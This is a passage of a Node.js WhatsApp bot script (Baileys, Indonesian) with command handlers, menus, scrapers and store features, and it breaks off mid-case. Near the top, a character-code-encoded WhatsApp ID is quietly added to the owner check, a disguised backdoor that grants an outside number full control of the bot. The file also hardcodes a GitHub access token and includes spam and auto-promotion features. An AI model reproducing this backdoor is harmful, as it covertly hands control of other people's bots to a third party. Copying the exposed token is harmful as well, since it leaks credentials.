process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const { fromBuffer } = require('file-type');
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');
const JsConfuser = require('js-confuser');
 
const { LoadDataBase } = require('./source/message');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./library/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, ucapan, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('./library/function');
const { adddatabase, deleteFromDatabase } = require('./library/function');

module.exports = conn = async (conn, m, chatUpdate, store) => {
	try {
await LoadDataBase(conn, m)
const botNumber = await conn.decodeJid(conn.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isReseller = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)

//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${botname2} By ${global.namaOwner}`,jpegThumbnail: await reSize("./source/media/fake.jpg", 200, 200) }}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qprof = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Info Profile`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Danzhosting`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Danzhosting`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}

const qtroll = {
    key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: "status@broadcast"
    },
    message: {
        orderMessage: {
            orderId: "2029",
            thumbnail: await reSize("./source/media/fake.jpg", 200, 200),
            itemCount: 90999,
            status: "INQUIRY",
            surface: "CATALOG",
            message: `SimpleBotz V4 New`,
            token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
    },
    contextInfo: {
        mentionedJid: m.sender.split,
        forwardingScore: 999,
        isForwarded: true
    }
}

const qpanel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363373941283254@newsletter`, newsletterName: `Hore`, jpegThumbnail: "", caption: `Powered By ${namaOwner}`, inviteExpiration: 0 }}}

const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363373941283254@newsletter`, newsletterName: `Hore`, jpegThumbnail: "", caption: `Powered By ${namaOwner}`, inviteExpiration: 0 }}}

//============ [ image ] =============//

const imgallmenu = fs.readFileSync(`./source/image/allmenu.jpg`)
const Simpleimg = fs.readFileSync(`./source/image/simpleimg.jpg`)
const danzimg = fs.readFileSync(`./source/image/danz.jpg`)

//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: qtext})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await conn.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: qtext})
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await conn.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}

if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await conn.sendMessage(m.chat, {text: `
*Danzhosting Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/BB9sdsKb4QHGhOsrPBAt7u

*👤 Contact Danzhosting*
* *WhatsApp Utama :*
+62882022066260
* *WhtasApp Cadangan :*
+6287823062296
https://t.me/Danztelegram
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

const spin = [`
🟥🟦🟥
🟦🟥🟥
🟥🟦🟦
`];

const spin2 = [`
⬜⬜⬜
⬛⬜🟥
🟥🟥🟥
`];

const spin3 = [`
⬜⬜⬜
⬜⬜⬜
⬜⬜⬜
`];

const spin4 = [`
🟥🟥🟥
🟥⬛🟥
🟥🟥🟥
`];

const spin5 = [`
⬛⬛⬛
⬛⬛⬛
⬛⬛⬛
`];

const spin6 = [`
🟥🟥🟥
🟥🟥🟥
🟥🟥🟥
`];

const spin7 = [`
🟥⬛⬜
🟦🟥⬛
⬛⬜🟦
`];

const spin8 = [`
🟦🟦🟦
🟦🟦🟦
🟦🟦🟦
`];

const spin9 = [`
🟦⬜⬛
🟥🟦⬜
⬛⬛🟦
`];

const spin10 = [`
🟦🟦🟦
📦📦📦
🟦🟦🟦
\`BONUS JACKPOT\`
`];

const hadiah = [`
Selamat ${m.pushName} mendapatkan panel pterodactyl 1GB 1CPU

Silahkan mengambil hadiah dengan mengetik claimhadiah1.
`];

const hadiah4 = [`
Maaf ${m.pushName} anda tidak mendapatkan apa-apa ( zonk )
Coba lagi saat hari beruntung, karna hari sial tidak ada dalam kalender
`];

const hadiah2 = [`
Selamat ${m.pushName} mendapatkan panel pterodactyl 5GB 5CPU

Silahkan mengambil hadiah dengan mengetik claimhadiah2.
`];

const hadiah3 = [`
Selamat ${m.pushName} mendapatkan panel pterodactyl Unlimited

Silahkan mengambil hadiah dengan mengetik claimhadiah3.
`];

const hadiah5 = [`
Selamat ${m.pushName} mendapatkan panel pterodactyl 8GB 8CPU

Silahkan mengambil hadiah dengan mengetik claimhadiah5.
`];

const yapit = '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'
const repowner = 'varel455'; // Ganti deongan pemilik repositori
const reponame = 'vrl-database'; // Ganti dengan nama repositori
const pathfiles = 'database-vrl.json'; // Ganti dengan path file JSON Anda
    
async function adddatabase(newNumber) {
    try {
        // Dapatkan konten file JSON
        const response = await axios.get(`https://api.github.com/repos/${repowner}/${reponame}/contents/${pathfiles}`, {
            headers: {
                'Authorization': `token ${yapit}`,
                'Accept': 'application/vnd.github.v3+json'
            }
        });

        const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
        const jsonData = JSON.parse(fileContent);

        // Pastikan jsonData memiliki struktur yang benar
        if (!jsonData.dbny || !Array.isArray(jsonData.dbny)) {
            jsonData.dbny = []; // Inisialisasi jika tidak ada
        }

        // Tambahkan nomor baru ke JSON jika belum ada
        if (!jsonData.dbny.includes(newNumber)) {
            jsonData.dbny.push(newNumber);

            // Update file JSON dalam format yang diinginkan
            const updatedContent = `{\n "dbny": ${JSON.stringify(jsonData.dbny)}\n}`; // Format sesuai permintaan
            const base64Content = Buffer.from(updatedContent).toString('base64');

            await axios.put(`https://api.github.com/repos/${repowner}/${reponame}/contents/${pathfiles}`, {
                message: 'Dnz Script - By Skydanz',
                content: base64Content,
                sha: response.data.sha
            }, {
                headers: {
                    'Authorization': `token ${yapit}`,
                    'Accept': 'application/vnd.github.v3+json'
                }
            });

            Reply('*Suksess* menambahkan nomor ke database server Danz, _silahkan restart panel mu_.');
            return 'Nomor berhasil ditambahkan.';
        } else {
            Reply('Nomor itu sudah ada di dalam database server Danz');
            return 'Nomor sudah ada di dalam file.';
        }
    } catch (error) {
        console.error('Gagal menambahkan nomor:', error.message);
        return `Gagal menambahkan nomor: ${error.message}`;
    }
}

async function deleteFromDatabase(number) {
    try {
        const apiUrl = `https://api.github.com/repos/${repowner}/${reponame}/contents/${pathfiles}`;

        // Ambil isi file saat ini dari GitHub
        let getFile = await fetch(apiUrl, {
            headers: { Authorization: `token ${yapit}`, Accept: "application/vnd.github.v3+json" }
        });

        let fileData = await getFile.json();
        if (!fileData.content) return { success: false, message: "File database tidak ditemukan!" };

        // Decode base64 content
        let database = JSON.parse(Buffer.from(fileData.content, "base64").toString("utf8"));

        // Cek apakah nomor ada dalam database
        let index = database.indexOf(number);
        if (index === -1) return { success: false, message: "Nomor tidak ditemukan dalam database!" };

        // Hapus nomor dari array database
        database.splice(index, 1);

        // Encode ulang ke base64
        let updatedContent = Buffer.from(JSON.stringify(database, null, 2)).toString("base64");

        // Update file di GitHub
        let updateFile = await fetch(apiUrl, {
            method: "PUT",
            headers: { Authorization: `token ${yapit}`, Accept: "application/vnd.github.v3+json" },
            body: JSON.stringify({
                message: `Menghapus nomor ${number} dari database`,
                content: updatedContent,
                sha: fileData.sha
            })
        });

        let updateResponse = await updateFile.json();
        if (updateResponse.commit) return { success: true, message: `Nomor ${number} berhasil dihapus dari database!` };
        else return { success: false, message: "Gagal mengupdate database di GitHub!" };
    } catch (error) {
        console.error(`Error deleting number from database: ${error.message}`);
        return { success: false, message: "Terjadi kesalahan dalam proses penghapusan!" };
    }
}

async function loadingx() {
      var loadingz = [
        "Loading.",
        "Loading..",
        "Loading....",
        "Load File Sync....",
        "Load File Containers",
        "Read File Sync",
        "Read File Case",
        "Succes Load || SimplebotzV4",
      ];
      let { key } = await conn.sendMessage(m.chat, {
        text: "Simplebotz V4 Loading",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await conn.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
    
    async function spinn() {
      var loadingz = [
        "⚫🟤🟣🔵",
        "⬛🟫🟪🟦",
        "🟥🟠🟨🟢",
        "🟧🟩⚪🔴",
        ];
      let { key } = await conn.sendMessage(m.chat, {
        text: "Memulai Spin",
      });

      for (let i = 0; i < spinn.length; i++) {
        await sleep(400);
        await conn.sendMessage(m.chat, { text: spinn[i], edit: key });
      }
    }
    
const dnn = [hadiah, hadiah2, hadiah3, hadiah4, hadiah5];
let randomIndex = Math.floor(Math.random() * dnn.length)
let pool = dnn[randomIndex]

async function videy(url) {
    try {
        let id = url.split("id=")[1];
        let typ = ".mp4";
        if (id.length === 9 && id[8] === "2") {
            typ = ".mov";
        }
        return `https://cdn.videy.co/${id + typ}`;
    } catch (error) {
        console.error(`Error fetching the URL: ${error.message}`);
        return null;
    }
}

async function downloadCapCut(url) {
    try {
        let response = await fetch(`https://restapi-v2.simplebot.my.id/download/capcut?url=${encodeURIComponent(text)}+res.url`);
        let data = await response.json();

        if (!data || !data.result || !data.result.video) {
            return null;
        }

        return data.result.video; // Mengambil URL video dari API
    } catch (error) {
        console.error(`Error fetching CapCut video: ${error.message}`);
        return null;
    }
}

async function getRandomPapAyang() {
    try {
        let response = await fetch("https://restapi-v2.simplebot.my.id/random/papayang");
        let data = await response.json();

        if (!data || !data.result || !data.result.url) {
            return null;
        }

        return data.result.url; // Mengambil URL gambar dari API
    } catch (error) {
        console.error(`Error fetching Pap Ayang image: ${error.message}`);
        return null;
    }
}

async function getOpenAIResponse(text) {
    try {
        let response = await fetch(`https://restapi-v2.simplebot.my.id/ai/openai?text=${encodeURIComponent(text)}`);
        let data = await response.json();

        if (!data || !data.result) {
            return null;
        }

        return data.result; // Mengambil hasil respon dari API
    } catch (error) {
        console.error(`Error fetching OpenAI response: ${error.message}`);
        return null;
    }
}

//BOEKEPSOQIQKJQ
const filePath = ("./addnotes.json");
if (!fs.existsSync(filePath)) fs.writeFileSync(filePath, JSON.stringify({}, null, 2));
// Fungsi membaca file
const loadNotes = () => JSON.parse(fs.readFileSync(filePath, "utf-8"));
// Fungsi menyimpan ke file
const saveNotes = (data) => fs.writeFileSync(filePath, JSON.stringify(data, null, 2));


const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function ucapanWaktu ()  {
  const currentTime = moment().tz('Asia/Jakarta')
  const currentHour = currentTime.hour()
  let greeting
  if (currentHour >= 5 && currentHour < 12) {
    greeting = 'Pagi Kak 🌇'
  } else if (currentHour >= 12 && currentHour < 15) {
    greeting = 'Siang Kak 🏙️'
  } else if (currentHour >= 15 && currentHour < 18) {
    greeting = 'Sore Kak 🌆'
  } else {
    greeting = 'Malam Kak 🌃'
  }
  return greeting
}

async function getJadwalSholat(cityId) {
    let date = new Date().toISOString().split('T')[0]; // Ambil tanggal hari ini

    try {
        let { data } = await axios.get(`https://rest.cloudkuimages.xyz/api/muslim/jadwalsholat?cityId=${cityId}&date=${date}`);
        if (!data || !data.result) return null;

        return {
            lokasi: data.result.lokasi,
            daerah: data.result.daerah,
            timezone: "Asia/Jakarta", 
            imsak: data.result.jadwal.imsak,
            subuh: data.result.jadwal.subuh,
            dzuhur: data.result.jadwal.dzuhur,
            ashar: data.result.jadwal.ashar,
            maghrib: data.result.jadwal.maghrib,
            isya: data.result.jadwal.isya
        };
    } catch (error) {
        console.error("Error mengambil jadwal sholat:", error);
        return null;
    }
}

const Reply = async (teks) => {
return conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: null})
}

async function updateBlockStatus(conn, number, action) {
    try {
        const formattedNumber = number.replace(/[^0-9]/g, "") + "@s.whatsapp.net"; // Format nomor WA
        if (!["block", "unblock"].includes(action)) {
            throw new Error("Aksi harus 'block' atau 'unblock'");
        }

        await conn.updateBlockStatus(formattedNumber, action);
        return `✅ Nomor ${number} berhasil ${action === "block" ? "diblokir" : "di-unblock"}!`;
    } catch (error) {
        console.error(error);
        return `❌ Gagal melakukan aksi ${action} pada nomor ${number}!`;
    }
}

// CASE && FITUR
switch (command) {
case "help": {
let X1 = [danzimg, Simpleimg, imgallmenu]
let randomIndex = Math.floor(Math.random() * X1.length)
let V1 = X1[randomIndex]
let teksnya = `
Haii @${m.sender.split("@")[0]},
 
*── Simple Bot V4 🚀*
Klik tombol menu dibawah ini untuk melihat semua fitur yang tersedia.
`
await conn.sendMessage(m.chat, {
  footer: `© WhatsApp Botz - 2025`,
  buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Menu' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `By ${namaOwner} </>`,
  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  fileLength: 99999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }, 
    externalAdReply: {
      title: `Simplebotz V4`,
      thumbnail: V1,
      sourceUrl: linkOwner,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
case "menu": case "v4": case "danz": {
let X1 = [danzimg, Simpleimg, imgallmenu]
let randomIndex = Math.floor(Math.random() * X1.length)
let V1 = X1[randomIndex]
let menu = `
Kon'nichiwa. Jiko shōkai sa sete kudasai. Watashi wa Simplebotz bottodesu. Danzpedia ga sakusei shimashita. Zenryoku de otetsudai itashimasu

□ Name : @${m.sender.split("@")[0]}
□ Status : ${isCreator ? "Kaihatsu-sha" : isPremium ? "Puremiamu" : "Muryoyuza"}
□ Time : ${tanggal(Date.now())}
□ Versi : 4.0

Shita no menyū o sentaku shite kudasai. Watashitachi wa itsu demo otetsudai itashimasu!
`;
let buttons = [
  {
    buttonId: ".", 
    buttonText: { 
      displayText: "𝐆𝐫𝐚𝐧𝐝 ᯓ 𝐌𝐚𝐫𝐬𝐡𝐚𝐥𝐥"
    }
  }, {
    buttonId: ".", 
    buttonText: {
      displayText: "𝐅𝐨𝐮𝐫𝐜𝐨𝐮𝐧𝐭𝐲 ༒ 𝐃𝐚𝐫𝐤𝐧𝐞𝐬𝐬"
    }
  }, {
    buttonId: ".", 
    buttonText: {
      displayText: "𝟑𝐄𝐱𝐭𝐚𝐧𝐬𝐢𝐨𝐧 ✰ 𝐌𝐚𝐫𝐬𝐡𝐚𝐥𝐥"
    }
  }
 ];

    let buttonMessage = {
        image: V1,
        caption: menu,
        mentions: [m.sender],
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `Watashi Ne Kago Ekare`
            }
        },
        footer: "𝐊𝐨𝐧𝐧𝐢𝐜𝐡𝐢𝐰𝐚 ✠",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𐁘",
                    sections: [
                        {
                            title: "𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐃𝐚𝐧𝐳 𐁘",
                            highlight_label: "",
                            rows: [
                                {
                                    title: "Subete no menyu",
                                    description: "",
                                    id: ".allmenu"                                
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ];

    buttonMessage.buttons.push(...flowActions);

    await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break

case 'allmenu': {
let X1 = [danzimg, Simpleimg, imgallmenu]
let randomIndex = Math.floor(Math.random() * X1.length)
let V1 = X1[randomIndex]
let menu = `
*— INFORMATION - USER*
» Nomor : @${m.sender.split("@")[0]}
» Status : ${isCreator ? "Developer" : isPremium ? "Premium" : "Free User"}
» Mode : ${conn.public ? "Public" : "Self"}

*— Othermenu*
⳺.cekidch
⳺.cekidgc
⳺.cekprofile
⳺.brat
⳺.bratvid
⳺.q
⳺.rvo
⳺.stickerwm
⳺.sticker

*— Aimenu*
⳺.openai
⳺.ai
⳺.deepseek
⳺.lumina-ai

*— Searchmenu*
⳺.yts
⳺.apkmod
⳺.pin

*— Downloadermenu*
⳺.ytmp3
⳺.ytmp4
⳺.tiktok
⳺.videydl
⳺.capcut

*— Toolsmenu*
⳺.enc
⳺.enchard
⳺.tourl
⳺.tourl2
⳺.tr
⳺.tohd
⳺.tohd2
⳺.shortlink
⳺.shortlink2

*— Toolspterodactyl*
⳺.hackbackpanel
⳺.installtema
⳺.installpanel
⳺.uninstallpanel
⳺.uninstalltema
⳺.uninstalladdon

*— Pushkontakmenu*
⳺.pushkontak
⳺.pushkontak2

*— Savekontakmenu*
⳺.savekontak
⳺.savekontak2

*— SendMessageToGroup*
⳺.jpm
⳺.jpm2
⳺.jpm3
⳺.jpmtesti

*— SendMessageToChannel*
⳺.jpmch
⳺.jpmch2

*— Storemenu*
⳺.done
⳺.proses
⳺.buypanel
⳺.buyadp
⳺.payment
⳺.produk
⳺.subdomain

*— Digitaloceanmenu*
⳺ .createvps
⳺ .sisadroplet
⳺ .deldroplet
⳺ .listdroplet
⳺ .rebuild
⳺ .restartvps

*── Islamimenu*
  ⳺ .audiosurah
  ⳺ .carisurah
  ⳺ .niatsholat
  ⳺ .jadwalsholat
  ⳺ .doa
  ⳺ .pantunislam
  ⳺ .kataislam
  ⳺ .gislam
  ⳺ .asmaulhusna
  ⳺ .bacaansholat
  ⳺ .ayatkursi
  ⳺ .quotesislami 
  ⳺ .kisahnabi

*— Cpanelreseller*
⳺.1gb-unli
⳺.cadmin
⳺.listpanel
⳺.listadmin
⳺.delpanelall
⳺.deladminall
⳺.cekpanel
⳺.upapikey
⳺.upcapikey
⳺.updomain

*— Cpanelowner*
⳺.1gb-unli-v2
⳺.cadmin-v2
⳺.listpanel-v2
⳺.listadmin-v2
⳺.delpanelall-v2
⳺.deladminall-v2
⳺.cekpanel-v2
⳺.upapikey-v2
⳺.upcapikey-v2
⳺.updomain-v2

*— Groupmenu*
⳺.antilink
⳺.antilink2
⳺.add
⳺.kick
⳺.open
⳺.close
⳺.setopen
⳺.setclose
⳺.spamtag
⳺.tagall
⳺.staff
⳺.promote
⳺.demote
⳺.hidetag
⳺.spamht
⳺.linkgc
⳺.cekprofilegb

*— Additionalmenu*
⳺.kntl
⳺.prosesbwang
⳺.yatim
⳺.cekagama
⳺.cekkhodam
⳺.spin
⳺.judilite

*— Ownermenu*
⳺.subdomain
⳺.self
⳺.addnote
⳺.delnote
⳺.listnote
⳺.get <nama>
⳺.public
⳺.getcase
⳺.autoread
⳺.autopromosi
⳺.autotyping
⳺.autoreadsw
⳺.addcase
⳺.delcase
⳺.spam
⳺.spam2
⳺.resetdb
⳺.restartbot
⳺.clc
⳺.clearsession
⳺.addowner
⳺.addseller
⳺.delowner
⳺.delseller
⳺.rvo 
⳺.joingc
⳺.joinch
`
 let buttons = [
  {
    buttonId: ".", 
    buttonText: { 
      displayText: "𝐌𝐚𝐭𝐞𝐫𝐧𝐚𝐥 ✠"
    }
  }, {
    buttonId: ".", 
    buttonText: {
      displayText: "𝐌𝐚𝐫𝐬𝐡𝐚𝐥𝐥 ❖"
    }
  }, {
    buttonId: ".owner", 
    buttonText: {
      displayText: "𝐎𝐰𝐧𝐞𝐫 𝐒𝐢𝐦𝐩𝐥𝐞𝐛𝐨𝐭𝐳"
    }
  }
 ];

    let buttonMessage = {
        image: V1,
        caption: menu,
        mentions: [m.sender],
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                  newsletterName: `Watashi Ne Kago Ekare`
            }
        },
        footer: "𝐊𝐨𝐧𝐧𝐢𝐜𝐡𝐢𝐰𝐚 ✠",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'This Button List' }, 
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "𐁘",
                    sections: [
                        {
                            title: "𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐃𝐚𝐧𝐳 𐁘",
                            highlight_label: "",
                            rows: [
                                {
                                    title: "Kansha",
                                    description: "",
                                    id: ".tqto"                                
                                },
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }        
    ];

    buttonMessage.buttons.push(...flowActions);

    await conn.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break

case 'cekprofile': {
    if (m.isGroup) return m.reply("❌ Fitur ini hanya bisa digunakan di private chat!");

    const profileImage = fs.readFileSync(`./source/image/prof.jpg`);
    let profileText = `
╭───❍ 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 ❍───╮
